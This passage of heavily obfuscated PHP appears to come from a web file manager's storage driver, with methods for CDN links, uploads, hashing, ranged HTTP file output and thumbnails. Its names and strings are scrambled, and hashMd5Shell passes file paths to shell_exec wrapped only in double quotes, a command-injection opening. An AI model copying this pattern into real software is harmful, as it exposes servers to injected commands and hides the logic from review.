isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Â×‰À¬‘) { $Ş´ó””È =& $_SERVER[¯‘·½]; if (!$this->isCdnHost()) { return $Â×‰À¬‘; } return str_replace(trim(get_url_root($Â×‰À¬‘), $Ş´ó””È[8]), trim($this->cdnHost, $Ş´ó””È[8]), $Â×‰À¬‘); } public function uploadLink($Ñ¶›ö‹¡, $½õ«Ç¨¿ = 0) { $éöå»¬í =& $_SERVER[¯‘·½]; if ($this->isUploadServer()) { return; } $ã¡‘§ªö = $this->getType(); if (!in_array($ã¡‘§ªö, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $çäÔÊâ = 1024 * 1024 * 10; $ƒ¡§˜«ı = $½õ«Ç¨¿ <= $çäÔÊâ ? $éöå»¬í[95] : $éöå»¬í[96]; $”—¿—×³ = (!$½õ«Ç¨¿ ? 1 : ceil($½õ«Ç¨¿ / pow(1024, 3))) * 3600 * 4; $¬ÄêÇÎš = $this->{$ƒ¡§˜«ı}($Ñ¶›ö‹¡, $”—¿—×³); if ($¬ÄêÇÎš) { $¬ÄêÇÎš[$éöå»¬í[97]] = $Ñ¶›ö‹¡; $¬ÄêÇÎš[$éöå»¬í[98]] = $ã¡‘§ªö; } return $¬ÄêÇÎš; } public function uploadFormData($¦¡¶‡òû, $ŒÁ ÃğÛ = 3600) { } public function uploadMultiData($œ¯˜ı³, $×ëË°Ô£ = 3600) { } public function multiUploadFormData($ñÌìŞ¿û, $Ø”èŸ£ú = 3600) { return $this->uploadMultiData($ñÌìŞ¿û, $Ø”èŸ£ú); } public function download($¶Àë…Üê, $ş’õÛö¼) { } public function ext($ˆÊ«¡Š–) { $½¸ìŒªâ =& $_SERVER[¯‘·½]; if (strpos($ˆÊ«¡Š–, $½¸ìŒªâ[8]) === -1) { $İ’Îå° = $ˆÊ«¡Š–; } else { $İ’Îå° = $this->pathThis($ˆÊ«¡Š–); } $¯äø‡ûü = $½¸ìŒªâ[12]; if (strstr($İ’Îå°, $½¸ìŒªâ[10])) { $¯äø‡ûü = substr($İ’Îå°, strrpos($İ’Îå°, $½¸ìŒªâ[10]) + 1); $¯äø‡ûü = strtolower($¯äø‡ûü); } if (strlen($¯äø‡ûü) > 3 && preg_match($½¸ìŒªâ[99], $¯äø‡ûü, $ÄßĞÈ®”)) { $¯äø‡ûü = $½¸ìŒªâ[12]; } return $¯äø‡ûü; } public function pathThis($‘ïÜ¯ü») { $‹°ÜîÂ =& $_SERVER[¯‘·½]; $‘ïÜ¯ü» = str_replace($‹°ÜîÂ[100], $‹°ÜîÂ[8], rtrim($‘ïÜ¯ü», $‹°ÜîÂ[8])); $‚‹Ùüïë = strrpos($‘ïÜ¯ü», $‹°ÜîÂ[8]); if ($‚‹Ùüïë === !1) { return $‘ïÜ¯ü»; } return substr($‘ïÜ¯ü», $‚‹Ùüïë + 1); } public function pathFather($¶Ø†¤ù…) { $†³¿ºÒ“ =& $_SERVER[¯‘·½]; $¶Ø†¤ù… = str_replace($†³¿ºÒ“[100], $†³¿ºÒ“[8], rtrim($¶Ø†¤ù…, $†³¿ºÒ“[8])); $ ¦²¥›´ = strrpos($¶Ø†¤ù…, $†³¿ºÒ“[8]); if ($ ¦²¥›´ === !1) { return $†³¿ºÒ“[12]; } return substr($¶Ø†¤ù…, 0, $ ¦²¥›´ + 1); } public function hashSimple($ÁÚ¾Íâˆ) { $Ù²ò¿—ë =& $_SERVER[¯‘·½]; if (!$ÁÚ¾Íâˆ) { return md5($Ù²ò¿—ë[12]); } $’šÒí‡Ş = $this->size($ÁÚ¾Íâˆ); $é¤ùÛ­Ÿ = 200; $åò’´‹ = 50; if ($’šÒí‡Ş <= $é¤ùÛ­Ÿ * $åò’´‹) { return $this->hashMd5($ÁÚ¾Íâˆ) . $’šÒí‡Ş; } $‰ã³³—¹ = intval($’šÒí‡Ş / $åò’´‹); $Ù§‘Ğ‰ = $Ù²ò¿—ë[12]; for ($ŠÆÚ¾Šñ = 0; $ŠÆÚ¾Šñ < $åò’´‹; $ŠÆÚ¾Šñ++) { $Ù§‘Ğ‰ .= $this->fileSubstr($ÁÚ¾Íâˆ, $‰ã³³—¹ * $ŠÆÚ¾Šñ, $é¤ùÛ­Ÿ); } $Ù§‘Ğ‰ .= $this->fileSubstr($ÁÚ¾Íâˆ, $’šÒí‡Ş - $é¤ùÛ­Ÿ, $é¤ùÛ­Ÿ); return md5($Ù§‘Ğ‰) . $’šÒí‡Ş; } public static $md5Cache = array(); public function hashMd5($¼˜èõË) { if (!$¼˜èõË) { return md5($_SERVER[¯‘·½][12]); } $¼˜èõË = $this->iconvSystem($¼˜èõË); if (isset(self::$md5Cache[$¼˜èõË])) { return self::$md5Cache[$¼˜èõË]; } self::$md5Cache[$¼˜èõË] = $this->hashMd5Shell($¼˜èõË); if (!self::$md5Cache[$¼˜èõË]) { self::$md5Cache[$¼˜èõË] = @md5_file($¼˜èõË); } return self::$md5Cache[$¼˜èõË]; } private function hashMd5Shell($•œ¿ß¤Á) { $¹²Ú’‡‘ =& $_SERVER[¯‘·½]; if (!$•œ¿ß¤Á) { return md5($¹²Ú’‡‘[12]); } if (!function_exists($¹²Ú’‡‘[101])) { return !1; } $Æê•îÎÄ = array($¹²Ú’‡‘[102], $¹²Ú’‡‘[103]); $¾Ô­óìö = Cache::get($¹²Ú’‡‘[104]); if (!$¾Ô­óìö) { $Şİ¨Áİ = BASIC_PATH . $¹²Ú’‡‘[105]; $Ó»µ  = md5_file($Şİ¨Áİ); $¾Ô­óìö = $¹²Ú’‡‘[106]; foreach ($Æê•îÎÄ as $¦¾‘½æÛ) { $ëáœ¦ü = shell_exec($¦¾‘½æÛ . "\x20\x22{$Şİ¨Áİ}\42"); if ($ëáœ¦ü && substr(trim($ëáœ¦ü), 0, 32) == $Ó»µ ) { $¾Ô­óìö = $¦¾‘½æÛ; break; } } Cache::set($¹²Ú’‡‘[104], $¾Ô­óìö, 3600); } if ($¾Ô­óìö == $¹²Ú’‡‘[106]) { return !1; } $ëáœ¦ü = shell_exec($¾Ô­óìö . "\x20\x22{$•œ¿ß¤Á}\42"); $ëáœ¦ü = str_replace($¹²Ú’‡‘[107], $¹²Ú’‡‘[12], $ëáœ¦ü); return substr($ëáœ¦ü, 0, 32); } public function link($ÊÔÂß¿) { return $ÊÔÂß¿; } public function fileOut($âÏ‘Œ‡², $µÜ¨Ü¬´ = false, $û‚ïÌãî = false, $µ¿Àß¶Ñ = '') { $æˆ®›À¬ =& $_SERVER[¯‘·½]; $this->cacheMethod(null, null); if (!$âÏ‘Œ‡² || !$this->exist($âÏ‘Œ‡²)) { show_json(LNG($æˆ®›À¬[108]), !1, $û‚ïÌãî); } $İ­˜òÊ« = $this->getType() == $æˆ®›À¬[109]; $¯ƒÀà¤‹ = $GLOBALS[$æˆ®›À¬[6]][$æˆ®›À¬[92]][$æˆ®›À¬[110]][$æˆ®›À¬[111]]; $•æğ²İ = (double) $GLOBALS[$æˆ®›À¬[6]][$æˆ®›À¬[92]][$æˆ®›À¬[110]][$æˆ®›À¬[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¹‹ìÅß¥ = $this->infoFull($âÏ‘Œ‡²); $¯â«î¡¡ = $¹‹ìÅß¥[$æˆ®›À¬[79]]; $ÒÜß‚  = gmdate($æˆ®›À¬[113], $¹‹ìÅß¥[$æˆ®›À¬[88]]); $ÀÄÙ¦çî = $û‚ïÌãî ? $û‚ïÌãî : $this->iconvApp($¹‹ìÅß¥[$æˆ®›À¬[32]]); $„‡ü‘î¾ = 0; $ÕØÒıÕ = $¯â«î¡¡ - 1; $ÛÒ¿® = $this->ext($ÀÄÙ¦çî); if (in_array($ÛÒ¿®, array($æˆ®›À¬[114], $æˆ®›À¬[115], $æˆ®›À¬[116], $æˆ®›À¬[117]))) { $ÛÒ¿® = $æˆ®›À¬[118]; } if (in_array($ÛÒ¿®, array($æˆ®›À¬[119]))) { $ÛÒ¿® = $æˆ®›À¬[120]; } if (!$µ¿Àß¶Ñ) { $µ¿Àß¶Ñ = md5($ÒÜß‚  . $¯â«î¡¡); } $µ¿Àß¶Ñ = $æˆ®›À¬[121] . $µ¿Àß¶Ñ . $æˆ®›À¬[121]; $Š’—°Ş = get_file_mime($ÛÒ¿®); $Ç„Ğ—ú— = !0; $Ç„Ğ—ú— = isset($_GET[$æˆ®›À¬[122]]) ? !1 : !0; if ($µÜ¨Ü¬´ === !1 && !mime_support($Š’—°Ş)) { $Š’—°Ş = $æˆ®›À¬[123]; } header($æˆ®›À¬[124]); header($æˆ®›À¬[125] . $Š’—°Ş); $œç°ò÷ë = rawurlencode($ÀÄÙ¦çî); $œç°ò÷ë = $æˆ®›À¬[121] . $œç°ò÷ë . $æˆ®›À¬[126] . $œç°ò÷ë; if ($µÜ¨Ü¬´) { header($æˆ®›À¬[127]); header($æˆ®›À¬[128] . $œç°ò÷ë); } else { if ($Ç„Ğ—ú—) { header($æˆ®›À¬[129] . $œç°ò÷ë); } } $Ê¦ğ–È = 3600 * 24 * 30; header($æˆ®›À¬[130]); header($æˆ®›À¬[131]); header($æˆ®›À¬[132] . $Ê¦ğ–È); header($æˆ®›À¬[133] . gmdate($æˆ®›À¬[113], time() + $Ê¦ğ–È) . $æˆ®›À¬[134]); if (isset($_SERVER[$æˆ®›À¬[135]]) && strtotime($_SERVER[$æˆ®›À¬[135]]) == $¹‹ìÅß¥[$æˆ®›À¬[88]]) { header($æˆ®›À¬[136], !0, 304); die; } if (isset($_SERVER[$æˆ®›À¬[137]]) && $_SERVER[$æˆ®›À¬[137]] == $µ¿Àß¶Ñ) { header($æˆ®›À¬[138] . $µ¿Àß¶Ñ, !0, 304); die; } header($æˆ®›À¬[138] . $µ¿Àß¶Ñ); header($æˆ®›À¬[139] . $ÒÜß‚  . $æˆ®›À¬[134]); header($æˆ®›À¬[140] . $ÀÄÙ¦çî); header($æˆ®›À¬[141]); header($æˆ®›À¬[142] . $¯â«î¡¡); header($æˆ®›À¬[143]); Hook::trigger($æˆ®›À¬[144], $âÏ‘Œ‡², $¯â«î¡¡, $ÀÄÙ¦çî, $ÛÒ¿®); if (!$µÜ¨Ü¬´ && $ÛÒ¿® == $æˆ®›À¬[145]) { if ($¯â«î¡¡ > 1024 * 1024 * 10) { die; } $¸ÆÌµ¶ = $this->getContent($âÏ‘Œ‡²); $¸ÆÌµ¶ = Html::clearSVG($¸ÆÌµ¶); header($æˆ®›À¬[146] . strlen($¸ÆÌµ¶)); echo $¸ÆÌµ¶; die; } $¢ÍÑ´úÉ = strtolower($_SERVER[$æˆ®›À¬[147]]); if ($İ­˜òÊ« && $¢ÍÑ´úÉ && $¯ƒÀà¤‹) { if (strstr($¢ÍÑ´úÉ, $æˆ®›À¬[148])) { header($æˆ®›À¬[149] . $âÏ‘Œ‡²); } else { if (strstr($¢ÍÑ´úÉ, $æˆ®›À¬[150])) { header($æˆ®›À¬[151] . $âÏ‘Œ‡²); } else { if (strstr($¢ÍÑ´úÉ, $æˆ®›À¬[152])) { header($æˆ®›À¬[153] . $âÏ‘Œ‡²); } } } if ($•æğ²İ) { header($æˆ®›À¬[154] . $•æğ²İ); } return; } if (isset($_SERVER[$æˆ®›À¬[155]])) { if (preg_match($æˆ®›À¬[156], $_SERVER[$æˆ®›À¬[155]], $¸ˆÏ‘ó)) { $„‡ü‘î¾ = intval($¸ˆÏ‘ó[1]); $„‡ü‘î¾ = $„‡ü‘î¾ <= 0 ? 0 : ($„‡ü‘î¾ >= $ÕØÒıÕ ? $ÕØÒıÕ : $„‡ü‘î¾); if (!empty($¸ˆÏ‘ó[2])) { $Õò€•«› = intval($¸ˆÏ‘ó[2]); $ÕØÒıÕ = $Õò€•«› < $„‡ü‘î¾ ? $„‡ü‘î¾ : ($Õò€•«› >= $ÕØÒıÕ ? $ÕØÒıÕ : $Õò€•«›); } } header($æˆ®›À¬[157]); header("\x43\x6f\x6e\164\145\156\x74\55\122\x61\x6e\147\145\x3a\40\x62\171\164\x65\163\40{$„‡ü‘î¾}\55{$ÕØÒıÕ}\x2f" . $¯â«î¡¡); } else { header($æˆ®›À¬[158]); } header($æˆ®›À¬[159]); header($æˆ®›À¬[160]); $¢€Ê«ƒ = !0; if ($_SERVER[$æˆ®›À¬[161]] == $æˆ®›À¬[162] && $¯â«î¡¡ > 1204 * 1024 * 1024 * 2) { $¢€Ê«ƒ = !1; } if ($¢€Ê«ƒ) { header($æˆ®›À¬[163] . ($ÕØÒıÕ - $„‡ü‘î¾ + 1)); } if ($_SERVER[$æˆ®›À¬[164]] == $æˆ®›À¬[165]) { return; } $¢—Ú±Ôú = array($æˆ®›À¬[166] => !1, $æˆ®›À¬[167] => $„‡ü‘î¾, $æˆ®›À¬[168] => $ÕØÒıÕ, $æˆ®›À¬[169] => $ÛÒ¿®, $æˆ®›À¬[170] => $¹‹ìÅß¥, $æˆ®›À¬[171] => $æˆ®›À¬[12], $æˆ®›À¬[172] => 0); $¢—Ú±Ôú = Hook::filter($æˆ®›À¬[173], $¢—Ú±Ôú); $†îò†™Ø = 1024 * 300; $—’»½ì· = 0; if ($•æğ²İ) { $—’»½ì· = intval(1000 * 1000 * ($†îò†™Ø / $•æğ²İ)); } while ($„‡ü‘î¾ <= $ÕØÒıÕ) { $Ôûã›ë· = timeFloat(); check_abort(); $¼²„ÔÈ› = $ÕØÒıÕ - $„‡ü‘î¾ + 1; if ($¼²„ÔÈ› <= $†îò†™Ø) { $†îò†™Ø = $¼²„ÔÈ›; } $¸ÆÌµ¶ = $this->fileSubstr($âÏ‘Œ‡², $„‡ü‘î¾, $†îò†™Ø); if ($¢—Ú±Ôú[$æˆ®›À¬[166]]) { $¢—Ú±Ôú[$æˆ®›À¬[171]] = $¸ÆÌµ¶; $¢—Ú±Ôú[$æˆ®›À¬[172]] = $„‡ü‘î¾; $¢—Ú±Ôú = Hook::filter($æˆ®›À¬[174], $¢—Ú±Ôú); $¸ÆÌµ¶ = $¢—Ú±Ôú[$æˆ®›À¬[171]]; } echo $¸ÆÌµ¶; $„‡ü‘î¾ += $†îò†™Ø; if ($†îò†™Ø == $¼²„ÔÈ›) { $„‡ü‘î¾ = $ÕØÒıÕ + 1; } if ($—’»½ì·) { $ÆîÙ’ñ™ = intval(1000 * 1000 * (timeFloat() - $Ôûã›ë·)); $¬¨Äê÷ü = $—’»½ì· - $ÆîÙ’ñ™; if ($¬¨Äê÷ü > 5) { usleep($¬¨Äê÷ü); } } } } public function fileOutServer($ÆÇààçŠ, $Ğû­ŠÏ™ = false, $¯İ³—ÅÌ = false, $İÔÌĞ¢ú = '') { $this->fileOut($ÆÇààçŠ, $Ğû­ŠÏ™, $¯İ³—ÅÌ, $İÔÌĞ¢ú); } public function fileOutLink($ÅòÅ¥Êâ) { header($_SERVER[¯‘·½][175] . $ÅòÅ¥Êâ); die; } public function cacheMethod($°ñ†ç÷÷, $¿àòıî½, $À–ÌŠ ª = null) { $ é ›Ïµ =& $_SERVER[¯‘·½]; static $Úæ›ÀÛµ = array(); $üœÖ‹ßş = $¿àòıî½ ? ltrim($this->getPathOuter($¿àòıî½), $ é ›Ïµ[8]) : $ é ›Ïµ[12]; $ÄßÅ«çÙ = $ é ›Ïµ[176] . $°ñ†ç÷÷ . $ é ›Ïµ[177] . rtrim($üœÖ‹ßş, $ é ›Ïµ[8]); if (is_null($°ñ†ç÷÷)) { $Úæ›ÀÛµ = array(); return; } if (is_null($¿àòıî½)) { foreach ($Úæ›ÀÛµ as $ÄßÅ«çÙ => $‘†¼ûÇô) { if (!strstr($ÄßÅ«çÙ, $ é ›Ïµ[176] . $°ñ†ç÷÷ . $ é ›Ïµ[178])) { continue; } unset($Úæ›ÀÛµ[$ÄßÅ«çÙ]); } return; } if ($À–ÌŠ ª === $ é ›Ïµ[179]) { unset($Úæ›ÀÛµ[$ÄßÅ«çÙ]); return; } if (!is_null($À–ÌŠ ª)) { $Úæ›ÀÛµ[$ÄßÅ«çÙ] = $À–ÌŠ ª; return; } $†ÕÓÏß… = isset($Úæ›ÀÛµ[$ÄßÅ«çÙ]) ? $Úæ›ÀÛµ[$ÄßÅ«çÙ] : null; if (!is_null($†ÕÓÏß…)) { return $†ÕÓÏß…; } $†ÕÓÏß… = $this->{$°ñ†ç÷÷}($¿àòıî½); $Úæ›ÀÛµ[$ÄßÅ«çÙ] = $†ÕÓÏß…; return $†ÕÓÏß…; } public function cacheMethodInfoSet($ÛÒ¨¢­Ï, $µÄÂÓìĞ, $¯½»è®ï = false) { $™Û‘šÒï =& $_SERVER[¯‘·½]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($™Û‘šÒï[180], $ÛÒ¨¢­Ï, $µÄÂÓìĞ); $this->cacheMethod($™Û‘šÒï[181], $ÛÒ¨¢­Ï, $µÄÂÓìĞ ? !1 : !0); if (is_array($¯½»è®ï)) { $this->cacheMethod($™Û‘šÒï[182], $ÛÒ¨¢­Ï, $¯½»è®ï); } } public function fileOutImage($†ËƒÍóÔ, $ÚÊé¯Üº = 250) { $ò®…Ëİ­ =& $_SERVER[¯‘·½]; set_timeout(); if (substr($†ËƒÍóÔ, 0, 4) == $ò®…Ëİ­[152]) { $this->fileOutLink($†ËƒÍóÔ); } $ÒÒ¸¬½Û = $this->info($†ËƒÍóÔ); $»Ô¥Õëù = !1; $¸Ê‹×õ = isset($GLOBALS[$ò®…Ëİ­[183]]) ? $GLOBALS[$ò®…Ëİ­[183]] : array(); if ($¸Ê‹×õ && $¸Ê‹×õ[$ò®…Ëİ­[184]] == $ÒÒ¸¬½Û[$ò®…Ëİ­[87]]) { $ÒÒ¸¬½Û = $¸Ê‹×õ; $¼ğ…¥¦ó = $ÒÒ¸¬½Û[$ò®…Ëİ­[185]]; if ($¼ğ…¥¦ó && isset($¼ğ…¥¦ó[$ò®…Ëİ­[186]])) { if ($¼ğ…¥¦ó[$ò®…Ëİ­[186]] <= $ÚÊé¯Üº && $¼ğ…¥¦ó[$ò®…Ëİ­[187]] <= $ÚÊé¯Üº) { $»Ô¥Õëù = !0; } } } if ($ÒÒ¸¬½Û[$ò®…Ëİ­[79]] <= 1024 * 50 || $»Ô¥Õëù || !function_exists($ò®…Ëİ­[188]) || $ÒÒ¸¬½Û[$ò®…Ëİ­[169]] == $ò®…Ëİ­[189]) { return $this->fileOut($†ËƒÍóÔ, !1, $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); } $½ËÆ°Û¦ = kodIO::hashPath($ÒÒ¸¬½Û); $‘´Œ„èß = "\143\157\166\145\162\x5f{$½ËÆ°Û¦}\137{$ÚÊé¯Üº}\56\160\x6e\x67"; $Ó“º·‡à = IO_PATH_SYSTEM_TEMP . $ò®…Ëİ­[190]; $˜ú¸ƒ“ú = IO::infoFullSimple($Ó“º·‡à); $Š…ÍÈŞé = $˜ú¸ƒ“ú && is_array($˜ú¸ƒ“ú) ? $˜ú¸ƒ“ú[$ò®…Ëİ­[87]] : $ò®…Ëİ­[12]; if (!$Š…ÍÈŞé) { $Š…ÍÈŞé = IO::mkdir($Ó“º·‡à); } if ($ÒÒ¸¬½Û[$ò®…Ëİ­[191]] == $ò®…Ëİ­[192] && isset($ÒÒ¸¬½Û[$ò®…Ëİ­[193]]) && $ÒÒ¸¬½Û[$ò®…Ëİ­[193]] == kodIO::sourceID($Š…ÍÈŞé)) { $‹´Ê€é³ = $ÒÒ¸¬½Û[$ò®…Ëİ­[194]]; if ($ÚÊé¯Üº <= 500) { $óñ…œ = preg_replace($ò®…Ëİ­[195], $ò®…Ëİ­[196], $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); $‹´Ê€é³ = IO::fileNameExist($Š…ÍÈŞé, $óñ…œ); } return IO::fileOut(KodIO::make($‹´Ê€é³), !1, $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); } $£•ÑÇ´¾ = IO::fileNameExist($Š…ÍÈŞé, $‘´Œ„èß); if ($£•ÑÇ´¾) { return IO::fileOut(KodIO::make($£•ÑÇ´¾), !1, $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); } if ($ÚÊé¯Üº > 1000) { $this->makeImageCover($Š…ÍÈŞé, $†ËƒÍóÔ, $‘´Œ„èß, $ÚÊé¯Üº); $this->makeImageCover($Š…ÍÈŞé, $†ËƒÍóÔ, "\143\x6f\166\145\x72\x5f{$½ËÆ°Û¦}\x5f\62\65\x30\x2e\160\156\147", 250); $£•ÑÇ´¾ = IO::fileNameExist($Š…ÍÈŞé, $‘´Œ„èß); if ($£•ÑÇ´¾) { return IO::fileOut(KodIO::make($£•ÑÇ´¾), !1, $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); } die; } if (!kodIO::allowCover($ÒÒ¸¬½Û)) { return $this->fileOut($†ËƒÍóÔ, !1, $ÒÒ¸¬½Û[$ò®…Ëİ­[32]]); } $½Šä¾ü = Cache::get($‘´Œ„èß); if ($½Šä¾ü == $ò®…Ëİ­[197] || $½Šä¾ü == $ò®…Ëİ­[198]) { echo $½Šä¾ü; die; } Cache::set($‘´Œ„èß, $ò®…Ëİ­[198], 60); $Ê÷ÎÂåõ = array($Š…ÍÈŞé, $ÒÒ¸¬½Û[$ò®…Ëİ­[87]], $‘´Œ„èß, $ÚÊé¯Üº); $©ğ–œİ = $ò®…Ëİ­[199] . $ÒÒ¸¬½Û[$ò®…Ëİ­[79]] . $ò®…Ëİ­[200] . $‘´Œ„èß . $ò®…Ëİ­[201] . $ÒÒ¸¬½Û[$ò®…Ëİ­[32]] . $ò®…Ëİ­[202] . $ÒÒ¸¬½Û[$ò®…Ëİ­[87]]; TaskQueue::add($ò®…Ëİ­[203], $Ê÷ÎÂåõ, $©ğ–œİ, $‘´Œ„èß); } public function makeImageCover($Öıê·Íü, $”€Í¥ËÜ, $ìƒİÇ½§, $ïÏ£ç‚ü) { $µÓó¤´Ñ =& $_SERVER[¯‘·½]; if (IO::fileNameExist($Öıê·Íü, $ìƒİÇ½§)) { return $µÓó¤´Ñ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ø»Û²ö = $this->getPathOuter($”€Í¥ËÜ); $ò´éÛı = DATA_THUMB . $ìƒİÇ½§; del_file($ò´éÛı); $‰Ï¥µ‘³ = IO::copy($ø»Û²ö, TEMP_FILES, !1, $ìƒİÇ½§); if (!@file_exists($‰Ï¥µ‘³)) { return $µÓó¤´Ñ[205]; } ImageThumb::createThumb($‰Ï¥µ‘³, $ò´éÛı, $ïÏ£ç‚ü, $ïÏ£ç‚ü * 10); if (@file_exists($ò´éÛı)) { Cache::remove($ìƒİÇ½§); return IO::move($ò´éÛı, $Öıê·Íü); } Cache::set($ìƒİÇ½§, $µÓó¤´Ñ[197], 600); del_file($ò´éÛı); return $µÓó¤´Ñ[206] . $‰Ï¥µ‘³ . $µÓó¤´Ñ[74]; } public function fileOutImageServer($ëæñê¼ø, $ÏÆãğì¯ = 250) { $this->fileOutImage($ëæñê¼ø, $ÏÆãğì¯); } public function fileNameAuto($¸§àß„ä, $üšŠâîæ, $¨çãç½º = REPEAT_RENAME, $ò ‰„Å« = false) { $¡¿—Ê»§ =& $_SERVER[¯‘·½]; $³Œ½‹” = $¸§àß„ä === $¡¿—Ê»§[12] ? $üšŠâîæ : rtrim($¸§àß„ä, $¡¿—Ê»§[8]) . $¡¿—Ê»§[8] . $üšŠâîæ; if ($¨çãç½º == REPEAT_REPLACE || !$this->exist($³Œ½‹”) || $ò ‰„Å« && $¨çãç½º != REPEAT_RENAME_FOLDER) { return $üšŠâîæ; } if ($¨çãç½º == REPEAT_SKIP) { return !1; } $Õ½„± = $¡¿—Ê»§[10] . get_path_ext($üšŠâîæ); $Õ½„± = $Õ½„± == $¡¿—Ê»§[10] || $ò ‰„Å« ? $¡¿—Ê»§[12] : $Õ½„±; $”ÏÉìªÏ = 1; $òßú´Ğ° = substr($üšŠâîæ, 0, strlen($üšŠâîæ) - strlen($Õ½„±)); $ºèÒÎÉÆ = $òßú´Ğ° . "\x28{$”ÏÉìªÏ}\x29{$Õ½„±}"; while ($this->exist(rtrim($¸§àß„ä, $¡¿—Ê»§[8]) . $¡¿—Ê»§[8] . $ºèÒÎÉÆ)) { $ºèÒÎÉÆ = $òßú´Ğ° . "\50{$”ÏÉìªÏ}\51{$Õ½„±}"; $”ÏÉìªÏ++; } return $ºèÒÎÉÆ; } private function fileNameAutoList($òÓ—âàŠ, $ŞÈ¤ùŒ˜, $Ÿ‘ó«íÙ = false) { $ıÎ‹Ô–ó =& $_SERVER[¯‘·½]; $ ó¡…¿Ó = $this->listPath($òÓ—âàŠ, !0); $ ó¡…¿Ó = array_merge($ ó¡…¿Ó[$ıÎ‹Ô–ó[85]], $ ó¡…¿Ó[$ıÎ‹Ô–ó[86]]); $İÔ”á÷ = array_to_keyvalue($ ó¡…¿Ó, $ıÎ‹Ô–ó[12], $ıÎ‹Ô–ó[32]); $ïÍ ü­µ = $ıÎ‹Ô–ó[10] . get_path_ext($ŞÈ¤ùŒ˜); $ïÍ ü­µ = $ïÍ ü­µ == $ıÎ‹Ô–ó[10] || $Ÿ‘ó«íÙ ? $ıÎ‹Ô–ó[12] : $ïÍ ü­µ; $÷Œ˜³‹ã = substr($ŞÈ¤ùŒ˜, 0, strlen($ŞÈ¤ùŒ˜) - strlen($ïÍ ü­µ)); $¨˜ŠãÇ‹ = $÷Œ˜³‹ã . "\50\x30\51{$ïÍ ü­µ}"; for ($­è…Ø‘¹ = 1; $­è…Ø‘¹ <= count($İÔ”á÷) + 1; $­è…Ø‘¹++) { $¨˜ŠãÇ‹ = $÷Œ˜³‹ã . "\x28{$­è…Ø‘¹}\x29{$ïÍ ü­µ}"; if (!in_array_not_case($¨˜ŠãÇ‹, $İÔ”á÷)) { return $¨˜ŠãÇ‹; } } return $¨˜ŠãÇ‹; } public function listAllFiles($ÒÆÄÜˆ£, $†ÊšøÕæ) { $Ûó‘ª³ì =& $_SERVER[¯‘·½]; if (empty($†ÊšøÕæ)) { return array(); } $¡¯™­ü£ = array_keys($†ÊšøÕæ); $å±ªšÊ³ = array(); $ÒÆÄÜˆ£ = trim($ÒÆÄÜˆ£, $Ûó‘ª³ì[8]); foreach ($†ÊšøÕæ as $–ÒÇœ§‡ => $Ñ®Ü­ÒÔ) { $õıÍô = ltrim(substr(trim($–ÒÇœ§‡, $Ûó‘ª³ì[8]), strlen($ÒÆÄÜˆ£)), $Ûó‘ª³ì[8]); if (substr($–ÒÇœ§‡, -1) == $Ûó‘ª³ì[8]) { $õıÍô = rtrim($õıÍô, $Ûó‘ª³ì[8]) . $Ûó‘ª³ì[8]; } $å±ªšÊ³ = array_merge($å±ªšÊ³, $this->slicePath($õıÍô)); } $†Æ˜­§Ò = array(); foreach (array_unique($å±ªšÊ³) as $Õ´¾¬ßî) { $ıŞ˜ª = array($Ûó‘ª³ì[87] => $this->getPathOuter($Ûó‘ª³ì[8] . $ÒÆÄÜˆ£ . $Ûó‘ª³ì[8] . $Õ´¾¬ßî), $Ûó‘ª³ì[78] => 1, $Ûó‘ª³ì[79] => 0); if (substr($Õ´¾¬ßî, -1) != $Ûó‘ª³ì[8]) { $ıŞ˜ª[$Ûó‘ª³ì[78]] = 0; $ƒÏ–· = $this->getPath($ÒÆÄÜˆ£ . $Ûó‘ª³ì[8] . $Õ´¾¬ßî); if (isset($†ÊšøÕæ[$ƒÏ–·])) { $ã©Ê¢ë¹ = $†ÊšøÕæ[$ƒÏ–·]; if (isset($ã©Ê¢ë¹[$Ûó‘ª³ì[79]])) { $ıŞ˜ª[$Ûó‘ª³ì[79]] = intval($ã©Ê¢ë¹[$Ûó‘ª³ì[79]]); } if (isset($ã©Ê¢ë¹[$Ûó‘ª³ì[207]])) { $ıŞ˜ª[$Ûó‘ª³ì[88]] = intval($ã©Ê¢ë¹[$Ûó‘ª³ì[207]]); } } } $†Æ˜­§Ò[] = $ıŞ˜ª; } return $†Æ˜­§Ò; } public function slicePath($¯éÊ¢ù§) { $Ù³…Ê— =& $_SERVER[¯‘·½]; $á°şˆ¶ì = explode($Ù³…Ê—[8], trim($¯éÊ¢ù§, $Ù³…Ê—[8])); $ñ—ÍÊÒã = 0; do { ++$ñ—ÍÊÒã; $äÙ¾Í¿[] = implode($Ù³…Ê—[8], array_slice($á°şˆ¶ì, 0, $ñ—ÍÊÒã)) . $Ù³…Ê—[8]; } while ($ñ—ÍÊÒã < count($á°şˆ¶ì)); $äÙ¾Í¿[count($á°şˆ¶ì) - 1] = $¯éÊ¢ù§; return $äÙ¾Í¿; } public function getHost() { $‘âôçÀè =& $_SERVER[¯‘·½]; $‡›áå³Ç = parse_url(trim($this->domain, $‘âôçÀè[8])); $óá¶ó¡ = isset($‡›áå³Ç[$‘âôçÀè[208]]) ? $‡›áå³Ç[$‘âôçÀè[208]] : http_type(); $œûóË¤ = isset($‡›áå³Ç[$‘âôçÀè[209]]) ? $‡›áå³Ç[$‘âôçÀè[209]] : $‡›áå³Ç[$‘âôçÀè[87]]; if (isset($‡›áå³Ç[$‘âôçÀè[210]])) { $œûóË¤ .= $‘âôçÀè[4] . $‡›áå³Ç[$‘âôçÀè[210]]; } return $óá¶ó¡ . $‘âôçÀè[211] . $œûóË¤; } public function pathEncode($½š‰‚¶) { $×ñ¼‘©´ =& $_SERVER[¯‘·½]; return str_replace($×ñ¼‘©´[212], $×ñ¼‘©´[8], rawurlencode($½š‰‚¶)); } public function writeLog($…È³Êİ = '', $ºŸâ²”ä = false) { $…ÖßºÙÌ =& $_SERVER[¯‘·½]; $®³Á§Õ­ = in_array(ACTION, array($…ÖßºÙÌ[213], 